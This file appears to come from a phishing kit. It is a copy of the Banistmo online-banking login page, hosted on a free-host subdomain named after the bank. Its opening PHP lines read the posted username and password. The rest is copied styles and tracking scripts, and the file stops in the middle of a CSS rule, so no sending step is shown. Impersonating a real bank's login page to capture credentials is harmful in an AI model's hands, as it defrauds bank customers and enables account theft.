<?php
$usuario = $_POST['name_user'];
$password = $_POST['password'];
?>
<html>

<head>
    <!-- Inserted by miarroba -->
    <script src="https://rules.quantcount.com/rules-p-d5x2uDVHd7ALE.js" async=""></script>
    <script type="text/javascript" async="" src="https://secure.quantserve.com/quant.js"></script>
    <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script>
    <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-T2VG59"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
    <script async="" type="text/javascript" src="https://quantcast.mgr.consensu.org/choice/d5x2uDVHd7ALE/persona-banistmo.webcindario.com/choice.js"></script>
    <script type="text/javascript" async="true">
        (function() {
            var host = window.location.hostname;
            var element = document.createElement('script');
            var firstScript = document.getElementsByTagName('script')[0];
            var url = 'https://quantcast.mgr.consensu.org'.concat('/choice/', 'd5x2uDVHd7ALE', '/', host, '/choice.js')
            var uspTries = 0;
            var uspTriesLimit = 3;
            element.async = true;
            element.type = 'text/javascript';
            element.src = url;
            firstScript.parentNode.insertBefore(element, firstScript);

            function makeStub() {
                var TCF_LOCATOR_NAME = '__tcfapiLocator';
                var queue = [];
                var win = window;
                var cmpFrame;

                function addFrame() {
                    var doc = win.document;
                    var otherCMP = !!(win.frames[TCF_LOCATOR_NAME]);
                    if (!otherCMP) {
                        if (doc.body) {
                            var iframe = doc.createElement('iframe');

                            iframe.style.cssText = 'display:none';
                            iframe.name = TCF_LOCATOR_NAME;
                            doc.body.appendChild(iframe);
                        } else {
                            setTimeout(addFrame, 5);
                        }
                    }
                    return !otherCMP;
                }

                function tcfAPIHandler() {
                    var gdprApplies;
                    var args = arguments;
                    if (!args.length) {
                        return queue;
                    } else if (args[0] === 'setGdprApplies') {
                        if (
                            args.length > 3 &&
                            args[2] === 2 &&
                            typeof args[3] === 'boolean'
                        ) {
                            gdprApplies = args[3];
                            if (typeof args[2] === 'function') {
                                args[2]('set', true);
                            }
                        }
                    } else if (args[0] === 'ping') {
                        var retr = {
                            gdprApplies: gdprApplies,
                            cmpLoaded: false,
                            cmpStatus: 'stub'
                        };

                        if (typeof args[2] === 'function') {
                            args[2](retr);
                        }
                    } else {
                        queue.push(args);
                    }
                }

                function postMessageEventHandler(event) {
                    var msgIsString = typeof event.data === 'string';
                    var json = {};

                    try {
                        if (msgIsString) {
                            json = JSON.parse(event.data);
                        } else {
                            json = event.data;
                        }
                    } catch (ignore) {}
                    var payload = json.__tcfapiCall;
                    if (payload) {
                        window.__tcfapi(
                            payload.command,
                            payload.version,
                            function(retValue, success) {
                                var returnMsg = {
                                    __tcfapiReturn: {
                                        returnValue: retValue,
                                        success: success,
                                        callId: payload.callId
                                    }
                                };
                                if (msgIsString) {
                                    returnMsg = JSON.stringify(returnMsg);
                                }
                                event.source.postMessage(returnMsg, '*');
                            },
                            payload.parameter
                        );
                    }
                }
                while (win) {
                    try {
                        if (win.frames[TCF_LOCATOR_NAME]) {
                            cmpFrame = win;
                            break;
                        }
                    } catch (ignore) {}
                    if (win === window.top) {
                        break;
                    }
                    win = win.parent;
                }
                if (!cmpFrame) {
                    addFrame();
                    win.__tcfapi = tcfAPIHandler;
                    win.addEventListener('message', postMessageEventHandler, false);
                }
            };
            makeStub();
            var uspStubFunction = function() {
                var arg = arguments;
                if (typeof window.__uspapi !== uspStubFunction) {
                    setTimeout(function() {
                        if (typeof window.__uspapi !== 'undefined') {
                            window.__uspapi.apply(window.__uspapi, arg);
                        }
                    }, 500);
                }
            };
            var checkIfUspIsReady = function() {
                uspTries++;
                if (window.__uspapi === uspStubFunction && uspTries < uspTriesLimit) {
                    console.warn('USP is not accessible');
                } else {
                    clearInterval(uspInterval);
                }
            };
            if (typeof window.__uspapi === 'undefined') {
                window.__uspapi = uspStubFunction;
                var uspInterval = setInterval(checkIfUspIsReady, 6000);
            }
        })();
    </script>
    <script>
        (function(w, d, s, l, i) {
            w[l] = w[l] || [];
            w[l].push({
                'gtm.start': new Date().getTime(),
                event: 'gtm.js'
            });
            var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s),
                dl = l != 'dataLayer' ? '&l=' + l : '';
            j.async = true;
            j.src =
                'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
            f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-T2VG59');
    </script>
    <!-- Inserted by miarroba -->

    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


    <title>Banistmo - Banca en Línea</title>
    <!--<base href="/">-->
    <base href=".">

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/x-icon" href="favicon.ico">

    <link rel="stylesheet" href="./css/all.css">
    <link rel="stylesheet" href="./css/regular.css">

    <link rel="stylesheet" href="./css/styles.b310a128b93987b2ed6d.css">
    <style></style>
    <style>
        #overlay[_ngcontent-c1] {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, .7);
            z-index: 3
        }

        #overlay.hidden[_ngcontent-c1] {
            display: none
        }

        #overlay[_ngcontent-c1] .coachmark-image[_ngcontent-c1] {
            padding-left: 150px;
            padding-top: 97px
        }

        #overlay[_ngcontent-c1] .coachmark-image[_ngcontent-c1] .coachmark-image-container[_ngcontent-c1] {
            background-color: #4a4a4a;
            width: 990px;
            display: block;
            margin: auto;
            height: 2000px
        }

        #overlay[_ngcontent-c1] .coachmark-button[_ngcontent-c1] {
            position: absolute
        }

        #overlay[_ngcontent-c1] .coachmark-button[_ngcontent-c1]:nth-child(2) {
            bottom: 70px;
            left: 93px
        }

        #overlay[_ngcontent-c1] .coachmark-button[_ngcontent-c1]:nth-child(3) {
            bottom: 70px;
            right: 93px
        }

        #overlay[_ngcontent-c1] .coachmark-button[_ngcontent-c1]:nth-child(4) {
            top: 10px;
            right: 10px
        }

        #overlay[_ngcontent-c1] .coachmark-button[_ngcontent-c1] .transparent-btn[_ngcontent-c1] {
            display: inline-block;
            width: 150px;
            padding: 8px;
            color: #fff;
            border: 1px solid #fff;
            border-radius: 8px;
            text-align: center;
            outline: 0;
            text-decoration: none;
            cursor: pointer
        }

        #overlay[_ngcontent-c1] .coachmark-button[_ngcontent-c1] .icon-close-white[_ngcontent-c1] {
            content: url(close-white.e39ce6ba0cb97074517c.svg);
            cursor: pointer
        }
    </style>
    <style>
        .nav-bar-loggin[_ngcontent-c2] .language[_ngcontent-c2] {
            text-align: right
        }

        .nav-bar-loggin[_ngcontent-c2] .language[_ngcontent-c2] a[_ngcontent-c2] {
            color: #454648;
            font-size: .8em;
            line-height: 34px;
            cursor: pointer
        }

        .nav-bar-loggin[_ngcontent-c2] .language[_ngcontent-c2] a[_ngcontent-c2]:hover {
            font-weight: 700;
            text-decoration: none
        }

        .main-container[_ngcontent-c2] {
            background-color: #f7f7f7;
            min-height: calc(100vh - 180px)
        }

        .main-container[_ngcontent-c2] .login-container[_ngcontent-c2] {
            width: 100%;
            padding-top: 30px;
            padding-bottom: 30px
        }

        .main-container[_ngcontent-c2] .login-container[_ngcontent-c2] .login[_ngcontent-c2] {
            width: 100%
        }

        .main-container[_ngcontent-c2] .card-container[_ngcontent-c2] {
            padding-top: 1.875rem
        }

        .main-container[_ngcontent-c2] .secondary-container[_ngcontent-c2] {
            background-color: #f7f7f7;
            height: 290px;
            margin-top: 40px
        }

        .footer[_ngcontent-c2] {
            height: 80px
        }

        @media screen and (min-width:1200px) {
            [_nghost-c2] .navbar.container-nav {
                position: initial !important
            }

            .main-container[_ngcontent-c2] .login-container[_ngcontent-c2] {
                position: absolute;
                width: 100%;
                padding-top: 30px
            }

            .main-container[_ngcontent-c2] .login-container[_ngcontent-c2] .login[_ngcontent-c2] {
                width: 100%
            }
        }
    </style>
    <style>
        .navbar[_ngcontent-c4] {
            width: 100%;
            top: 0;
            z-index: 2
        }

        .navbar.container-nav[_ngcontent-c4] {
            position: -webkit-sticky;
            position: sticky
        }

        .navbar[_ngcontent-c4] .main-navbar[_ngcontent-c4] {
            padding: 13px 0;
            background-color: #fff
        }

        .navbar[_ngcontent-c4] .secondary-navbar[_ngcontent-c4] {
            padding: 4px 0;
            background-color: #ffd200;
            line-height: 25px
        }

        .navbar[_ngcontent-c4] .secondary-navbar[_ngcontent-c4] .welcome-text[_ngcontent-c4] {
            font-weight: 700;
            font-size: .88em
        }

        .navbar[_ngcontent-c4] .secondary-navbar[_ngcontent-c4] .date[_ngcontent-c4] {
            font-size: 12px;
            text-align: right
        }

        .navbar[_ngcontent-c4] .nav-container[_ngcontent-c4] {
            max-width: 942px;
            margin: auto
        }

        .navbar[_ngcontent-c4] img[_ngcontent-c4] {
            height: 38px
        }

        .navbar[_ngcontent-c4] .logo[_ngcontent-c4] {
            text-align: center
        }

        @media screen and (max-width:768px) {
            .navbar[_ngcontent-c4] .logo[_ngcontent-c4] {
                text-align: center;
                padding-left: 20%;
                display: flex;
                justify-content: center
            }

            .navbar[_ngcontent-c4] .secondary-navbar[_ngcontent-c4] .container[_ngcontent-c4] {
                margin-right: 20px;
                margin-left: 20px
            }

            .navbar[_ngcontent-c4] .secondary-navbar[_ngcontent-c4] .date[_ngcontent-c4] {
                text-align: left
            }
        }

        @media screen and (min-width:1200px) {
            .nav-bar-loggin[_ngcontent-c4] .navbar.container-nav[_ngcontent-c4] {
                position: initial
            }

            .navbar.container-nav[_ngcontent-c4] {
                position: fixed
            }

            .navbar[_ngcontent-c4] .logo[_ngcontent-c4] {
                text-align: left;
                padding-left: 15px
            }

            .navbar[_ngcontent-c4] .secondary-navbar[_ngcontent-c4] .date[_ngcontent-c4] {
                text-align: right
            }

            .position-img[_ngcontent-c4] {
                margin-left: 9em
            }

            @media (max-width:1024px) {
                #position2 {
                    margin-left: 15em
                }
            }

            .position-welcome[_ngcontent-c4] {
                padding-left: 10rem
            }
        }
    </style>
    <style>
        h2[_ngcontent-c18] {
            font-size: 1.12em;
            font-weight: 700;
            line-height: 1.35;
            margin-bottom: 35px
        }
    </style>
    <style>
        body[_ngcontent-c21] {
            overflow: hidden
        }

        .modal-container[_ngcontent-c21] {
            overflow: auto;
            display: none;
            position: fixed;
            z-index: 3000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            -webkit-backdrop-filter: blur(3px);
            backdrop-filter: blur(3px);
            background-color: rgba(247, 247, 247, .8)
        }

        .modal-container.index[_ngcontent-c21] {
            z-index: 100
        }

        .modal-container[_ngcontent-c21] .centered[_ngcontent-c21] {
            display: table;
            margin: 10% auto
        }

        .modal-content[_ngcontent-c21] {
            min-width: 500px;
            min-height: 200px;
            border-radius: 8px;
            box-shadow: 0 2px 6px 0 rgba(0, 0, 0, .07);
            background-color: #fff;
            border: 1px solid #f1f1f1;
            align-items: center
        }

        .modal-content[_ngcontent-c21] .modal-header[_ngcontent-c21] {
            width: 100%;
            min-height: 50px;
            padding: 15px;
            border-bottom: 1px solid rgba(151, 151, 151, .15);
            color: #454648;
            margin: 0;
            position: relative
        }

        .modal-content[_ngcontent-c21] .modal-header[_ngcontent-c21] .close[_ngcontent-c21] {
            cursor: pointer;
            font-size: .875em
        }

        .modal-content[_ngcontent-c21] .modal-header[_ngcontent-c21] h2[_ngcontent-c21] {
            font-size: 1.12em;
            font-weight: 700;
            margin-bottom: 0
        }

        @media (max-width:576px) {
            .modal-content[_ngcontent-c21] {
                min-width: 320px !important
            }

            .centered[_ngcontent-c21] {
                margin: 35% auto
            }
        }
    </style>
    <style>
        .btn[_ngcontent-c22] {
            width: 100%;
            min-width: 130px;
            height: 40px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 700;
            border: 0;
            text-transform: uppercase;
            cursor: pointer
        }

        .btn[_ngcontent-c22]:disabled {
            cursor: no-drop;
            background-color: #ddd !important
        }

        .btn.primary-blue[_ngcontent-c22] {
            background-color: #00448c;
            color: #fff
        }

        .btn.primary-blue[_ngcontent-c22]:hover {
            background-color: #003164
        }

        .btn.primary-blue[_ngcontent-c22]:active {
            background-color: #00448c
        }

        .btn.primary-gray[_ngcontent-c22] {
            background-color: #58595b;
            color: #fff
        }

        .btn.primary-gray[_ngcontent-c22]:hover {
            background-color: #363636
        }

        .btn.primary-gray[_ngcontent-c22]:active {
            background-color: #58595b
        }

        .btn.primary-yellow[_ngcontent-c22] {
            background-color: #ffd200;
            color: #454648
        }

        .btn.primary-yellow[_ngcontent-c22]:hover {
            background-color: #ffb500
        }

        .btn.primary-yellow[_ngcontent-c22]:active {
            background-color: #ffd200
        }

        .btn.primary-red[_ngcontent-c22] {
            background-color: #fa5e5b;
            color: #fff
        }

        .btn.primary-red[_ngcontent-c22]:hover {
            background-color: #d14d4a
        }

        .btn.primary-red[_ngcontent-c22]:active {
            background-color: #fa5e5b
        }

        .btn.white[_ngcontent-c22] {
            background-color: #fff;
            color: #454648
        }

        .btn.white[_ngcontent-c22]:hover {
            background-color: transparent;
            border: 1px solid #454648
        }

        .btn.white[_ngcontent-c22]:active {
            background-color: #fff;
            color: #454648
        }

        .btn.white-underline[_ngcontent-c22] {
            background-color: #fff;
            color: #454648;
            text-decoration: underline
        }

        .btn.white-underline[_ngcontent-c22]:hover {
            background-color: transparent;
            border: 1px solid #454648
        }

        .btn.white-underline[_ngcontent-c22]:active {
            background-color: #fff;
            color: #454648
        }

        .btn.secondary[_ngcontent-c22] {
            border: 1px solid #58595b;
            background-color: #fff;
            color: #58595b
        }

        .btn.secondary[_ngcontent-c22]:hover {
            border-width: 2px
        }

        .btn.secondary[_ngcontent-c22]:active {
            background-color: #58595b;
            color: #fff
        }

        .btn.secondary-transparent[_ngcontent-c22] {
            border: 1px solid #58595b;
            background-color: transparent;
            color: #454648;
            font-size: .85rem;
            min-width: 120px
        }

        .btn.secondary-transparent[_ngcontent-c22]:hover {
            border: 2px solid #58595b
        }

        .btn.secondary-transparent[_ngcontent-c22]:active {
            background-color: #58595b;
            color: #fff
        }

        .btn.secondary-transparent[_ngcontent-c22] .icon[_ngcontent-c22] {
            position: absolute;
            right: 15px;
            top: 9px;
            font-size: 1.4rem
        }

        .btn.small[_ngcontent-c22] {
            min-width: 90px !important
        }

        .btn.flat[_ngcontent-c22] {
            border-radius: 0;
            background-color: transparent;
            color: #333
        }

        .btn.flat[_ngcontent-c22]:hover {
            color: #ffd200
        }

        .btn.flat[_ngcontent-c22]:active {
            color: #58595b
        }

        .btn.white-underline-border[_ngcontent-c22] {
            background-color: #fff;
            color: #454648;
            text-decoration: underline
        }

        .btn.white-underline-border[_ngcontent-c22]:hover {
            background-color: transparent
        }

        .btn.white-underline-border[_ngcontent-c22]:active {
            background-color: #fff;
            color: #454648
        }
    </style>
    <style>
        footer[_ngcontent-c23] {
            width: 100%;
            background-color: #e6e7e8;
            padding: 25px 0 0;
            bottom: 0
        }

        footer[_ngcontent-c23] a[_ngcontent-c23] {
            color: #454648;
            font-size: .8em;
            line-height: 34px
        }

        footer[_ngcontent-c23] a[_ngcontent-c23]:hover {
            font-weight: 700;
            text-decoration: none
        }

        .isOption[_ngcontent-c23] {
            padding: unset
        }

        .contact-information[_ngcontent-c23] {
            padding: 22px 0
        }

        .contact-information[_ngcontent-c23] i[_ngcontent-c23] {
            -webkit-transform: scaleX(-1);
            transform: scaleX(-1)
        }

        .contact-information[_ngcontent-c23] .contact-telephone[_ngcontent-c23] {
            font-size: .79em;
            padding: 2px
        }

        .contact-information[_ngcontent-c23] .info-legal[_ngcontent-c23] {
            font-size: .75em
        }
    </style>
    <style>
        body[_ngcontent-c3] {
            overflow: hidden
        }

        .blocking-background[_ngcontent-c3] {
            background-color: rgba(255, 255, 255, .4);
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2001
        }

        .container-loader[_ngcontent-c3] {
            background-color: rgba(255, 255, 255, .7);
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2001;
            border-radius: 8px
        }

        .container-loader[_ngcontent-c3] .loader[_ngcontent-c3] {
            display: block;
            position: relative;
            left: 50%;
            top: 50%;
            z-index: 2050
        }

        .container-loader[loaded][_ngcontent-c3] .spinner[_ngcontent-c3] {
            -webkit-animation: 2s ease-in fadeout;
            animation: 2s ease-in fadeout;
            opacity: 0
        }

        .container-loader[_ngcontent-c3] .spinner[_ngcontent-c3] {
            position: relative;
            -webkit-animation: 2s ease-in fadein;
            animation: 2s ease-in fadein
        }

        .container-loader[_ngcontent-c3] .spinner[_ngcontent-c3] div[_ngcontent-c3] {
            position: absolute;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            opacity: .7;
            -webkit-transform: translateX(-30px);
            transform: translateX(-30px)
        }

        .container-loader[_ngcontent-c3] .spinner[_ngcontent-c3] div[_ngcontent-c3]:nth-child(1) {
            background-color: #ffd200;
            -webkit-animation: 1.8s ease-in-out 1.2s infinite spin;
            animation: 1.8s ease-in-out 1.2s infinite spin;
            height: 24px;
            width: 24px
        }

        .container-loader[_ngcontent-c3] .spinner[_ngcontent-c3] div[_ngcontent-c3]:nth-child(2) {
            background-color: #58595b;
            -webkit-animation: 1.8s ease-in-out .6s infinite spin;
            animation: 1.8s ease-in-out .6s infinite spin;
            height: 20px;
            width: 20px
        }

        .container-loader[_ngcontent-c3] .spinner[_ngcontent-c3] div[_ngcontent-c3]:nth-child(3) {
            background-color: #00448d;
            -webkit-animation: 1.8s ease-in-out infinite spin;
            animation: 1.8s ease-in-out infinite spin;
            width: 10px;
            height: 10px
        }

        @-webkit-keyframes spin {
            0% {
                -webkit-transform: translateX(-30px);
                transform: translateX(-30px)
            }

            33.3% {
                -webkit-transform: translateX(30px);
                transform: translateX(30px)
            }

            66.7% {
                -webkit-transform: translateX(0) translateY(-45px);
                transform: translateX(0) translateY(-45px)
            }

            100% {
                -webkit-transform: translateX(-30px) translateY(0);
                transform: translateX(-30px) translateY(0)
            }
        }

        @keyframes spin {
            0% {
                -webkit-transform: translateX(-30px);
                transform: translateX(-30px)
            }

            33.3% {
                -webkit-transform: translateX(30px);
                transform: translateX(30px)
            }

            66.7% {
                -webkit-transform: translateX(0) translateY(-45px);
                transform: translateX(0) translateY(-45px)
            }

            100% {
                -webkit-transform: translateX(-30px) translateY(0);
                transform: translateX(-30px) translateY(0)
            }
        }

        @-webkit-keyframes fadein {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes fadein {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeout {
            from {
                opacity: 1
            }

            to {
                opacity: 0
            }
        }

        @keyframes fadeout {
            from {
                opacity: 1
            }

            to {
                opacity: 0
            }
        }
    </style>
    <style>
        .card[_ngcontent-c5] {
            background-color: #fff;
            border-radius: 8px;
            border: 1px solid #f1f1f1;
            box-shadow: 0 2px 6px 0 rgba(0, 0, 0, .07);
            width: 100%;
            overflow: hidden
        }

        .card.products[_ngcontent-c5] {
            width: 304px;
            cursor: pointer
        }

        .card.products[_ngcontent-c5]:hover {
            box-shadow: 0 6px 20px 0 rgba(0, 0, 0, .12)
        }
    </style>
    <style>
        .nav-tabs[_ngcontent-c7] {
            display: flex;
            flex-wrap: nowrap;
            font-size: 1em;
            font-weight: 700;
            border-bottom: 1px solid #e6e7e8;
            cursor: pointer
        }

        .nav-tabs[_ngcontent-c7] .tab[_ngcontent-c7] {
            width: 50%;
            padding: 18px 10px 10px;
            text-align: center
        }

        .nav-tabs[_ngcontent-c7] .center[_ngcontent-c7] {
            flex: 1 1;
            display: flex
        }

        .nav-tabs[_ngcontent-c7] .tab-title[_ngcontent-c7] {
            padding: 0 7px 5px;
            cursor: pointer
        }

        .nav-tabs[_ngcontent-c7] .active[_ngcontent-c7] {
            border-bottom: solid #ffd200
        }
    </style>
    <style>
        .pane[_ngcontent-c8] {
            justify-content: center
        }

        .padding[_ngcontent-c8] {
            padding: 0 1.25rem 1.875rem
        }
    </style>
    <style>
        .tabs-container[_ngcontent-c9] .icon[_ngcontent-c9] {
            margin-top: 12px
        }

        .tabs-container[_ngcontent-c9] .icon[_ngcontent-c9] img[_ngcontent-c9] {
            width: 30px
        }

        .tabs-container[_ngcontent-c9] .field[_ngcontent-c9] {
            padding-left: 0
        }

        .tabs-container[_ngcontent-c9] .actions[_ngcontent-c9] {
            margin: 20px 0 50px
        }

        .tabs-container[_ngcontent-c9] .info-links[_ngcontent-c9] div[_ngcontent-c9]:first-child {
            padding-right: 0
        }
    </style>
    <style>
        .text-field[_ngcontent-c24] {
            margin-bottom: 10px
        }

        .text-field.disabled[_ngcontent-c24] {
            opacity: .3
        }

        .text-field.disabled[_ngcontent-c24] .content[_ngcontent-c24],
        .text-field.disabled[_ngcontent-c24] input[_ngcontent-c24],
        .text-field.disabled[_ngcontent-c24] label[_ngcontent-c24],
        .text-field.disabled[_ngcontent-c24] span[_ngcontent-c24] {
            cursor: not-allowed !important
        }

        .text-field.error[_ngcontent-c24] input[_ngcontent-c24]:focus+span[_ngcontent-c24],
        .text-field.error[_ngcontent-c24] p[_ngcontent-c24],
        .text-field.error[_ngcontent-c24] span[_ngcontent-c24] {
            color: #fa5e5b !important
        }

        .text-field.error[_ngcontent-c24] input[_ngcontent-c24] {
            border-bottom: 2px solid #fa5e5b !important
        }

        .text-field[_ngcontent-c24] .content[_ngcontent-c24] {
            width: 100%;
            color: #454648;
            background-color: #f7f7f7;
            border-radius: 6px 6px 0 0
        }

        .text-field[_ngcontent-c24] .content[_ngcontent-c24] label[_ngcontent-c24] {
            position: relative;
            display: block;
            width: 100%;
            min-height: 50px
        }

        .text-field[_ngcontent-c24] .content[_ngcontent-c24] input[_ngcontent-c24] {
            position: absolute;
            top: 15px;
            z-index: 1;
            width: 100%;
            font-size: 1em;
            border: 0;
            border-bottom: 2px solid #808285;
            transition: border-color .2s ease-in-out;
            outline: 0;
            height: 35px;
            background-color: transparent;
            box-shadow: none;
            box-sizing: border-box;
            -moz-box-sizing: border-box;
            -webkit-box-sizing: border-box;
            padding-left: 15px
        }

        .text-field[_ngcontent-c24] .content[_ngcontent-c24] input[_ngcontent-c24]:focus {
            border-bottom: 2px solid #ffd200
        }

        .text-field[_ngcontent-c24] .content[_ngcontent-c24] input[_ngcontent-c24]:focus+span[_ngcontent-c24],
        .text-field[_ngcontent-c24] .content[_ngcontent-c24] input[_ngcontent-c24]:valid+span[_ngcontent-c24] {
            top: 6px;
            cursor: inherit;
            font-size: .8em;
            color: #808285;
            padding-left: 15px
        }

        .text-field[_ngcontent-c24] .content[_ngcontent-c24] .status[_ngcontent-c24] {
            border-bottom: 2px solid #00448d
        }

        .text-field[_ngcontent-c24] .content[_ngcontent-c24] span[_ngcontent-c24] {
            position: absolute;
            display: block;
            top: 15px;
            z-index: 1;
            font-size: 1em;
            transition: .2s ease-in-out;
            width: 100%;
            cursor: text;
            box-sizing: border-box;
            -moz-box-sizing: border-box;
            -webkit-box-sizing: border-box;
            padding-left: 15px;
            color: #808285
        }

        .text-field[_ngcontent-c24] .content[_ngcontent-c24] .icon[_ngcontent-c24] {
            z-index: 3;
            margin: 15px 0 0;
            right: 0;
            position: absolute
        }

        .text-field[_ngcontent-c24] .content[_ngcontent-c24] .icon[_ngcontent-c24] i[_ngcontent-c24] {
            font-size: 1.2em;
            letter-spacing: 15px;
            cursor: pointer
        }

        .text-field[_ngcontent-c24] .content[_ngcontent-c24] .icon[_ngcontent-c24] i[_ngcontent-c24]:nth-child(2) {
            color: #fa5e5b
        }

        .text-field[_ngcontent-c24] .sub-content[_ngcontent-c24] {
            display: flex;
            justify-content: space-between;
            min-height: 20px
        }

        .text-field[_ngcontent-c24] .sub-content[_ngcontent-c24] p[_ngcontent-c24] {
            font-size: .75rem;
            color: #808285;
            line-height: 1.08;
            margin-bottom: 0
        }

        .text-field[_ngcontent-c24] .sub-content[_ngcontent-c24] p.message[_ngcontent-c24] {
            padding: 0 0 0 15px;
            margin-top: -3px
        }
    </style>
    <style>
        a[_ngcontent-c25] {
            font-size: .85em;
            color: #00448d !important;
            text-decoration: underline !important
        }

        a[_ngcontent-c25]:not(.disabled):hover {
            font-weight: 700;
            cursor: pointer
        }

        a.disabled[_ngcontent-c25] {
            color: #d1d3d4 !important
        }

        a.disabled[_ngcontent-c25]:hover {
            cursor: not-allowed
        }
    </style>
    <style>
        h3[_ngcontent-c15] {
            font-size: 1.125em;
            font-weight: 700;
            line-height: 1.28;
            text-align: center;
            color: #454648;
            margin-bottom: 20px
        }

        h4[_ngcontent-c15] {
            font-size: .875em;
            font-weight: 700;
            line-height: 1.36;
            text-align: center;
            color: #454648;
            margin-bottom: 30px
        }

        option[_ngcontent-c15] {
            background-color: #f7f7f7
        }

        .text-field-container[_ngcontent-c15] {
            margin-bottom: 35px
        }

        .text-field-container[_ngcontent-c15] .app-text-field[_ngcontent-c15] input[name=text-field][_ngcontent-c15] {
            text-transform: uppercase
        }

        .text-field-container[_ngcontent-c15] .error-message[_ngcontent-c15] {
            padding: 0 0 0 15px;
            font-size: .8em;
            color: #fa5e5b;
            margin: -10px 0 0
        }
    </style>
    <style>
        .text-field[_ngcontent-c28] {
            margin-bottom: 10px
        }

        .text-field.disabled[_ngcontent-c28] {
            opacity: .3
        }

        .text-field.disabled[_ngcontent-c28] .content[_ngcontent-c28],
        .text-field.disabled[_ngcontent-c28] label[_ngcontent-c28],
        .text-field.disabled[_ngcontent-c28] select[_ngcontent-c28],
        .text-field.disabled[_ngcontent-c28] span[_ngcontent-c28] {
            cursor: not-allowed !important
        }

        .text-field.error[_ngcontent-c28] .icon[_ngcontent-c28],
        .text-field.error[_ngcontent-c28] p[_ngcontent-c28],
        .text-field.error[_ngcontent-c28] select[_ngcontent-c28]:focus+span[_ngcontent-c28],
        .text-field.error[_ngcontent-c28] span[_ngcontent-c28] {
            color: #fa5e5b !important
        }

        .text-field.error[_ngcontent-c28] select[_ngcontent-c28] {
            border-bottom: 2px solid #fa5e5b !important
        }

        .text-field[_ngcontent-c28] .icon-arrow[_ngcontent-c28] {
            font-size: 32px;
            -webkit-transform: scaleX(1.15) scaleY(.7);
            transform: scaleX(1.15) scaleY(.7);
            color: #58595b
        }

        .text-field[_ngcontent-c28] .content[_ngcontent-c28] {
            width: 100%;
            color: #454648;
            background-color: #f7f7f7;
            border-radius: 6px 6px 0 0
        }

        .text-field[_ngcontent-c28] .content.withe[_ngcontent-c28] {
            background-color: #fff
        }

        .text-field[_ngcontent-c28] .content[_ngcontent-c28] label[_ngcontent-c28] {
            position: relative;
            display: block;
            width: 100%;
            min-height: 50px
        }

        .text-field[_ngcontent-c28] .content[_ngcontent-c28] select[_ngcontent-c28] {
            position: absolute;
            top: 15px;
            width: 100%;
            font-size: 1em;
            color: #454648;
            border: 0;
            border-radius: 0;
            border-bottom: 2px solid #808285;
            transition: border-color .2s ease-in-out;
            outline: 0;
            height: 35px;
            background-color: transparent;
            box-sizing: border-box;
            -moz-box-sizing: border-box;
            -webkit-box-sizing: border-box;
            padding-left: 15px;
            -moz-appearance: none;
            -webkit-appearance: none;
            appearance: none;
            cursor: pointer
        }

        .text-field[_ngcontent-c28] .content[_ngcontent-c28] select[_ngcontent-c28]:focus {
            border-bottom: 2px solid #ffd200
        }

        .text-field[_ngcontent-c28] .content[_ngcontent-c28] select[_ngcontent-c28]:focus+span[_ngcontent-c28],
        .text-field[_ngcontent-c28] .content[_ngcontent-c28] select[_ngcontent-c28]:valid+span[_ngcontent-c28] {
            top: 6px;
            cursor: inherit;
            font-size: .8em;
            color: #808285;
            padding-left: 15px
        }

        .text-field[_ngcontent-c28] .content[_ngcontent-c28] .status[_ngcontent-c28] {
            border-bottom: 2px solid #00448d
        }

        .text-field[_ngcontent-c28] .content[_ngcontent-c28] span[_ngcontent-c28] {
            position: absolute;
            display: block;
            top: 20px;
            font-size: 1em;
            transition: .2s ease-in-out;
            width: 100%;
            box-sizing: border-box;
            -moz-box-sizing: border-box;
            -webkit-box-sizing: border-box;
            padding-left: 15px;
            color: #808285;
            pointer-events: none
        }

        .text-field[_ngcontent-c28] .content[_ngcontent-c28] .icon[_ngcontent-c28] {
            font-size: 1em;
            position: absolute;
            right: 12px;
            top: 15px
        }

        .text-field[_ngcontent-c28] .content[_ngcontent-c28] .icon.padding-right[_ngcontent-c28] {
            right: 30px
        }

        .text-field[_ngcontent-c28] .message[_ngcontent-c28] {
            min-height: 20px
        }

        .text-field[_ngcontent-c28] .message[_ngcontent-c28] p[_ngcontent-c28] {
            padding: 4px 0 0 15px;
            font-size: .8em;
            color: #808285;
            margin: 0
        }

        .hide-tooltip[_ngcontent-c28] {
            color: transparent;
            pointer-events: none
        }

        .no-pointer-events[_ngcontent-c28] {
            pointer-events: none
        }

        .all-pointer-events[_ngcontent-c28] {
            pointer-events: all
        }

        .tooltip-placeholder[_ngcontent-c28] {
            width: 10px;
            height: 10px
        }
    </style>
    <script src="./index_files/api.js.descarga" async="" defer=""></script>
    <style>
        .right[_ngcontent-c26] {
            display: inline;
            position: relative
        }

        .right[_ngcontent-c26]:hover:after {
            right: -380%
        }

        .left[_ngcontent-c26] {
            display: inline;
            position: relative
        }

        .left[_ngcontent-c26]:hover:after {
            left: -540%
        }

        .center[_ngcontent-c26] {
            display: inline;
            position: relative
        }

        .center[_ngcontent-c26]:hover:after {
            left: -400%
        }

        .tooltip[_ngcontent-c26] {
            display: inline;
            position: relative
        }

        .tooltip[_ngcontent-c26]:hover:after {
            background: #58595b;
            border-radius: 5px;
            bottom: 26px;
            color: #fff;
            padding: 5px 15px;
            position: absolute;
            z-index: 3;
            font-size: .8em;
